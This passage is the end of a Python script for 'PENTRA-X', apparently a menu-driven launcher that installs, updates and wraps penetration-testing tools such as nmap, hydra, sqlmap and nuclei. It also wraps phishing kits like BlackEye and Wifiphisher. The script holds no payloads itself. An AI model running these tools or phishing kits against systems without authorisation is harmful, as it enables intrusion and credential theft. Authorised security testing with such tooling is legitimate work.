        print(f"{Colors.OKCYAN}{i}.{Colors.ENDC} {category}")
    
    print(f"{Colors.OKCYAN}0.{Colors.ENDC} Exit")
    
    choice = safe_input(f"\n{Colors.OKGREEN}Select Category > {Colors.ENDC}")
    if choice is None:
        return
    
    choice = choice.strip()
    
    if choice == "0":
        print("Exiting...")
        exit()
    
    try:
        choice_num = int(choice)
        if 1 <= choice_num <= len(main_categories):
            selected_category = main_categories[choice_num - 1]
            show_category_menu(selected_category)
        else:
            print("[-] Invalid option.")
    except ValueError:
        print("[-] Invalid input.")

# Replace the old menu system with the new categorized one
def main_menu():
    """Main menu loop with categorized tools"""
    while True:
        show_main_menu()

def auto_integrate_tools():
    """Automatically integrate newly installed tools into the menu system"""
    print(f"{Colors.OKCYAN}[+] Auto-Integrating Tools into Menu System{Colors.ENDC}")
    
    # Define tool integrations
    tool_integrations = {
        "Network Reconnaissance": [
            ("subfinder", "Subfinder Subdomain Enumeration", "subfinder_wrapper"),
            ("amass", "Amass Network Mapping", "amass_wrapper"),
            ("naabu", "Naabu Port Scanner", "naabu_wrapper"),
            ("httpx", "HTTPX Web Scanner", "httpx_wrapper"),
            ("nuclei", "Nuclei Vulnerability Scanner", "nuclei_wrapper"),
            ("photon", "Photon Web Crawler", "photon_wrapper"),
        ],
        
        "Web Testing & Exploitation": [
            ("wpscan", "WPScan WordPress Scanner", "wpscan_wrapper"),
            ("nikto", "Nikto Web Vulnerability Scanner", "nikto_wrapper"),
            ("whatweb", "WhatWeb Web Technology Detector", "whatweb_wrapper"),
        ],
        
        "Information Gathering": [
            ("sherlock", "Sherlock Username Enumeration", "sherlock_wrapper"),
            ("theharvester", "TheHarvester Email/Subdomain Enumeration", "theharvester_wrapper"),
            ("recon-ng", "Recon-ng Reconnaissance Framework", "recon_ng_wrapper"),
            ("shodan", "Shodan Search", "shodan_wrapper"),
        ],
        
        "Social Engineering": [
            ("wifiphisher", "Wifiphisher WiFi Phishing", "wifiphisher_wrapper"),
        ]
    }
    
    # Check for newly installed tools and create wrappers
    for category, tools in tool_integrations.items():
        for tool_cmd, tool_name, wrapper_name in tools:
            if shutil.which(tool_cmd) and not hasattr(sys.modules[__name__], wrapper_name):
                print(f"{Colors.OKBLUE}[*] Creating wrapper for {tool_name}...{Colors.ENDC}")
                create_tool_wrapper(tool_cmd, tool_name, wrapper_name)
    
    print(f"{Colors.OKGREEN}[+] Tool integration completed!{Colors.ENDC}")

def create_tool_wrapper(tool_cmd, tool_name, wrapper_name):
    """Dynamically create a wrapper function for a tool"""
    
    def wrapper_func():
        print(f"[+] {tool_name}")
        print(f"[!] This tool requires proper configuration.")
        
        # Get target from user
        target = input(f"Target for {tool_cmd}: ").strip()
        if not target:
            print("[-] Target required.")
            return
        
        # Get additional options
        options = input(f"Additional {tool_cmd} options (optional): ").strip()
        
        # Build command
        cmd = [tool_cmd]
        if options:
            cmd.extend(options.split())
        cmd.append(target)
        
        print(f"[+] Running: {' '.join(cmd)}")
        
        try:
            # Run the tool
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            if proc.stdout is not None:
                for line in proc.stdout:
                    print(line, end='')
            proc.wait()
            print(f"[+] {tool_name} completed.")
        except Exception as e:
            print(f"[-] {tool_name} failed: {e}")
        
        input("\n[Press Enter to return to the menu]")
    
    # Add the wrapper to the global namespace
    globals()[wrapper_name] = wrapper_func

def manage_tools():
    """Tool management system"""
    print(f"{Colors.OKCYAN}[+] Tool Management System{Colors.ENDC}")
    
    while True:
        print(f"\n{Colors.OKCYAN}=== Tool Management ==={Colors.ENDC}")
        print("1. Install Missing Tools")
        print("2. Update All Tools")
        print("3. List Installed Tools")
        print("4. Check Tool Status")
        print("5. Auto-Integrate New Tools")
        print("6. Create Custom Tool Wrapper")
        print("0. Back to Main Menu")
        
        choice = safe_input(f"\n{Colors.OKGREEN}Select Option > {Colors.ENDC}")
        if choice is None:
            continue
        
        choice = choice.strip()
        
        if choice == "1":
            check_and_prompt_dependencies()
        elif choice == "2":
            update_all_tools()
        elif choice == "3":
            list_installed_tools()
        elif choice == "4":
            check_tool_status()
        elif choice == "5":
            auto_integrate_tools()
        elif choice == "6":
            create_custom_wrapper()
        elif choice == "0":
            break
        else:
            print("[-] Invalid option.")

def update_all_tools():
    """Update all installed tools"""
    print(f"{Colors.OKBLUE}[*] Updating all tools...{Colors.ENDC}")
    
    try:
        # Update package manager tools
        safe_subprocess_run(["sudo", "apt", "update"])
        safe_subprocess_run(["sudo", "apt", "upgrade", "-y"])
        
        # Update Python tools
        safe_subprocess_run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
        safe_subprocess_run([sys.executable, "-m", "pip", "list", "--outdated", "--format=freeze"], capture_output=True)
        
        # Update Go tools
        safe_subprocess_run(["go", "install", "-u", "all"])
        
        # Update Ruby tools
        safe_subprocess_run(["sudo", "gem", "update"])
        
        # Update GitHub tools
        github_tools = [
            "/opt/BlackEye",
            "/opt/SocialFish", 
            "/opt/HiddenEye",
            "/opt/wifiphisher",
            "/opt/sherlock",
            "/opt/Photon",
            "/opt/subfinder",
            "/opt/amass",
            "/opt/nuclei",
            "/opt/httpx",
            "/opt/naabu",
            "/opt/theHarvester",
            "/opt/recon-ng",
        ]
        
        for tool_path in github_tools:
            if os.path.exists(tool_path):
                print(f"{Colors.OKBLUE}[*] Updating {os.path.basename(tool_path)}...{Colors.ENDC}")
                try:
                    safe_subprocess_run(["sudo", "git", "-C", tool_path, "pull"], capture_output=True)
                except Exception as e:
                    print(f"{Colors.FAIL}[-] Failed to update {tool_path}: {e}{Colors.ENDC}")
        
        print(f"{Colors.OKGREEN}[+] All tools updated!{Colors.ENDC}")
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Update process cancelled by user{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[-] Update failed: {e}{Colors.ENDC}")

def list_installed_tools():
    """List all installed tools"""
    print(f"{Colors.OKCYAN}[+] Installed Tools{Colors.ENDC}")
    
    # Check package manager tools
    package_tools = ["nmap", "hydra", "sqlmap", "gobuster", "aircrack-ng", "bettercap", "dirb", "nikto", "whatweb"]
    print(f"\n{Colors.OKBLUE}Package Manager Tools:{Colors.ENDC}")
    for tool in package_tools:
        if shutil.which(tool):
            print(f"  ✓ {tool}")
        else:
            print(f"  ✗ {tool}")
    
    # Check GitHub tools
    github_tools = [
        ("BlackEye", "/opt/BlackEye"),
        ("SocialFish", "/opt/SocialFish"),
        ("HiddenEye", "/opt/HiddenEye"),
        ("Wifiphisher", "/opt/wifiphisher"),
        ("Sherlock", "/opt/sherlock"),
        ("Photon", "/opt/Photon"),
        ("Subfinder", "/opt/subfinder"),
        ("Amass", "/opt/amass"),
        ("Nuclei", "/opt/nuclei"),
        ("HTTPX", "/opt/httpx"),
        ("Naabu", "/opt/naabu"),
        ("TheHarvester", "/opt/theHarvester"),
        ("Recon-ng", "/opt/recon-ng"),
    ]
    
    print(f"\n{Colors.OKBLUE}GitHub Tools:{Colors.ENDC}")
    for name, path in github_tools:
        if os.path.exists(path):
            print(f"  ✓ {name}")
        else:
            print(f"  ✗ {name}")
    
    # Check Python tools
    python_tools = ["requests", "beautifulsoup4", "selenium", "scapy", "shodan"]
    print(f"\n{Colors.OKBLUE}Python Tools:{Colors.ENDC}")
    for tool in python_tools:
        try:
            __import__(tool)
            print(f"  ✓ {tool}")
        except ImportError:
            print(f"  ✗ {tool}")

def check_tool_status():
    """Check the status of all tools"""
    print(f"{Colors.OKCYAN}[+] Tool Status Check{Colors.ENDC}")
    
    # Test core tools
    core_tools = ["nmap", "hydra", "sqlmap", "gobuster"]
    print(f"\n{Colors.OKBLUE}Testing Core Tools:{Colors.ENDC}")
    
    for tool in core_tools:
        if shutil.which(tool):
            try:
                result = subprocess.run([tool, "--version"], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    version = result.stdout.split('\n')[0] if result.stdout else "Unknown"
                    print(f"  ✓ {tool} - {version}")
                else:
                    print(f"  ⚠ {tool} - Installed but not working")
            except Exception:
                print(f"  ⚠ {tool} - Installed but not working")
        else:
            print(f"  ✗ {tool} - Not installed")

def create_custom_wrapper():
    """Create a custom tool wrapper"""
    print(f"{Colors.OKCYAN}[+] Create Custom Tool Wrapper{Colors.ENDC}")
    
    tool_name = input("Tool name: ").strip()
    if not tool_name:
        print("[-] Tool name required.")
        return
    
    tool_path = input("Tool path or command: ").strip()
    if not tool_path:
        print("[-] Tool path required.")
        return
    
    category = input("Category (Network Reconnaissance/Web Testing/Wireless Attacks/etc.): ").strip()
    if not category:
        print("[-] Category required.")
        return
    
    # Create wrapper function
    wrapper_code = f'''
def {tool_name.lower()}_wrapper():
    print(f"[+] {tool_name}")
    target = input("Target: ").strip()
    if not target:
        print("[-] Target required.")
        return
    
    options = input("Additional options: ").strip()
    cmd = ["{tool_path}"]
    if options:
        cmd.extend(options.split())
    cmd.append(target)
    
    print(f"[+] Running: {{' '.join(cmd)}}")
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"[-] Failed: {{e}}")
    
    input("\\n[Press Enter to return to the menu]")
'''
    
    # Save wrapper to file
    wrapper_file = f"custom_wrappers/{tool_name.lower()}_wrapper.py"
    os.makedirs("custom_wrappers", exist_ok=True)
    
    with open(wrapper_file, "w") as f:
        f.write(wrapper_code)
    
    print(f"{Colors.OKGREEN}[+] Custom wrapper created: {wrapper_file}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] You can now use this tool in the {category} category{Colors.ENDC}")

# Global variables for cleanup
running_processes = []
active_spinners = []

def cleanup_resources():
    """Clean up all resources before exit"""
    print(f"{Colors.OKCYAN}[*] Cleaning up resources...{Colors.ENDC}")
    
    # Stop all active spinners
    for spinner in active_spinners[:]:  # Copy list to avoid modification during iteration
        try:
            spinner.stop()
        except Exception:
            pass
    
    # Terminate all running processes
    for process in running_processes[:]:  # Copy list to avoid modification during iteration
        try:
            if process.poll() is None:  # Process is still running
                print(f"{Colors.OKBLUE}[*] Terminating process: {process.args[0] if hasattr(process, 'args') else 'Unknown'}{Colors.ENDC}")
                process.terminate()
                try:
                    process.wait(timeout=3)  # Wait up to 3 seconds
                except subprocess.TimeoutExpired:
                    print(f"{Colors.WARNING}[!] Force killing process{Colors.ENDC}")
                    process.kill()
                    process.wait()
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error terminating process: {e}{Colors.ENDC}")
    
    # Clean up temporary files
    temp_patterns = [
        "pentrax_temp_*.txt",
        "pentrax_scan_*.xml", 
        "pentrax_output_*.log",
        "pentrax_hash_*.txt",
        "pentrax_*.cap",
        "pentrax_*.pcap",
        "pentrax_*.csv"
    ]
    
    cleaned_files = 0
    for pattern in temp_patterns:
        try:
            import glob
            for temp_file in glob.glob(pattern):
                try:
                    os.remove(temp_file)
                    cleaned_files += 1
                except Exception:
                    pass
        except Exception:
            pass
    
    if cleaned_files > 0:
        print(f"{Colors.OKGREEN}[+] Cleaned up {cleaned_files} temporary files{Colors.ENDC}")

def signal_handler(sig, frame):
    """Handle CTRL+C gracefully"""
    print(f"\n\n{Colors.WARNING}[!] Interrupted by user (Ctrl+C){Colors.ENDC}")
    print(f"{Colors.OKCYAN}[*] Cleaning up and exiting gracefully...{Colors.ENDC}")
    
    # Perform cleanup
    cleanup_resources()
    
    # Clear screen and show exit message
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        pass
    
    print(f"\n{Colors.OKGREEN}╔══════════════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.OKGREEN}║                    PENTRA-X EXIT SUMMARY                    ║{Colors.ENDC}")
    print(f"{Colors.OKGREEN}╠══════════════════════════════════════════════════════════════╣{Colors.ENDC}")
    print(f"{Colors.OKCYAN}║  ✓ Graceful shutdown completed                              ║{Colors.ENDC}")
    print(f"{Colors.OKCYAN}║  ✓ All processes terminated safely                          ║{Colors.ENDC}")
    print(f"{Colors.OKCYAN}║  ✓ Temporary files cleaned up                              ║{Colors.ENDC}")
    print(f"{Colors.OKGREEN}╚══════════════════════════════════════════════════════════════╝{Colors.ENDC}")
    print(f"\n{Colors.OKBLUE}Thank you for using PENTRA-X!{Colors.ENDC}")
    print(f"{Colors.WARNING}Remember: Use responsibly and ethically.{Colors.ENDC}\n")
    sys.exit(0)

# Update the main execution to use the new categorized menu system
if __name__ == "__main__":
    # Set up signal handler for CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        check_and_prompt_dependencies()
        main_menu()
    except KeyboardInterrupt:
        signal_handler(signal.SIGINT, None)
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Unexpected error: {e}{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Please report this issue to the developers.{Colors.ENDC}")
        sys.exit(1)
